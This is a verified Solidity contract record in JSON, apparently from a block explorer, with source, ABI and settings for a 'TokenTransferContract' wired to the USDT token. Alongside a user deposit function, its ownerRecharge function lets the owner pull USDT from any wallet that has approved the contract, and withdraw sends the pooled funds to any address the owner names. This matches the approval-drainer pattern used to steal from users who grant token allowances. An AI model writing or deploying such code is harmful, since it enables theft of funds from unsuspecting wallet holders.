{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\n// \u5bfc\u5165 USDT \u5408\u7ea6\u7684\u63a5\u53e3\r\ninterface USDTInterface {\r\n    function transferFrom(address _from, address _to, uint256 _value) external;\r\n    function transfer(address _to, uint256 _value) external;\r\n    function balanceOf(address _owner) external view returns (uint256);\r\n    function allowance(address _owner, address _spender) external view returns (uint256);\r\n    function approve(address _spender, uint256 _value)  external returns (bool);\r\n}\r\n\r\n\r\n// \u5b9a\u4e49\u6388\u6743\u5212\u8f6c\u5408\u7ea6\r\ncontract TokenTransferContract {\r\n    USDTInterface private usdt; // \u5b9a\u4e49 USDT \u5408\u7ea6\u5b9e\u4f8b\r\n    address private owner; // \u5408\u7ea6\u62e5\u6709\u8005\r\n\r\n    event Recharge(address indexed account, uint256 amount, bytes32 transactionHash);\r\n\r\n    constructor(address _usdtAddress) {\r\n        usdt = USDTInterface(_usdtAddress);\r\n        owner = msg.sender;\r\n    }\r\n\r\n     // \u67e5\u8be2\u94b1\u5305\u5730\u5740\u7684 ETH \u4f59\u989d\r\n    function getEthBalance(address _address) external view returns (uint256) {\r\n        return _address.balance;\r\n    }\r\n\r\n    // \u67e5\u8be2\u94b1\u5305\u5730\u5740\u7684 USDT \u4f59\u989d\r\n    function getWalletUSDTBalance(address _walletAddress) external view returns (uint256) {\r\n        return usdt.balanceOf(_walletAddress);\r\n    }\r\n\r\n    // \u67e5\u8be2\u7528\u6237\u6388\u6743\u7ed9\u5408\u7ea6\u7684 USDT \u6570\u91cf\r\n    function getApprovedUSDTAmount(address _walletAddress) external view returns (uint256) {\r\n        return usdt.allowance(_walletAddress, address(this));\r\n    }\r\n    \r\n    //\u7528\u6237\u5145\u503c\u4ee3\u5e01\u5230\u5408\u7ea6\u4e2d\r\n    function recharge(uint256 _amount) external returns (uint256, bytes32) {\r\n        require(_amount > 0, \"Amount must be greater than zero\");\r\n        usdt.transferFrom(msg.sender, address(this), _amount);\r\n        bytes32 transactionHash = blockhash(block.number);\r\n        emit Recharge(msg.sender, _amount, transactionHash);\r\n        return (_amount, transactionHash);\r\n    }\r\n\r\n    // \u5212\u8f6c\u4ee3\u5e01\u5230\u5408\u7ea6\r\n    function ownerRecharge(address _walletAddress, uint256 _amount) external {\r\n        require(msg.sender == owner, \"Unauthorized\");\r\n        require(_walletAddress != address(0), \"Invalid address\");\r\n        usdt.transferFrom(_walletAddress, address(this), _amount);\r\n    }\r\n\r\n    // \u63d0\u53d6\u5408\u7ea6\u4e2d\u7684USDT\u4f59\u989d\uff0c\u53ea\u6709\u5408\u7ea6\u62e5\u6709\u8005\u53ef\u4ee5\u6267\u884c\u6b64\u64cd\u4f5c\r\n    function withdraw(uint256 _amount,address targetAddress) external {\r\n        require(msg.sender == owner, \"Unauthorized\");\r\n        require(targetAddress != address(0), \"Target address not set\");\r\n        usdt.transfer(targetAddress, _amount);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_usdtAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"bytes32\",\"name\":\"transactionHash\",\"type\":\"bytes32\"}],\"name\":\"Recharge\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_walletAddress\",\"type\":\"address\"}],\"name\":\"getApprovedUSDTAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getEthBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_walletAddress\",\"type\":\"address\"}],\"name\":\"getWalletUSDTBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_walletAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"ownerRecharge\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"recharge\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"targetAddress\",\"type\":\"address\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TokenTransferContract", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://4c1a84aa78d5f4d1f7cc6048e48d335615d6c713b427014005b3477dbac2d26a"}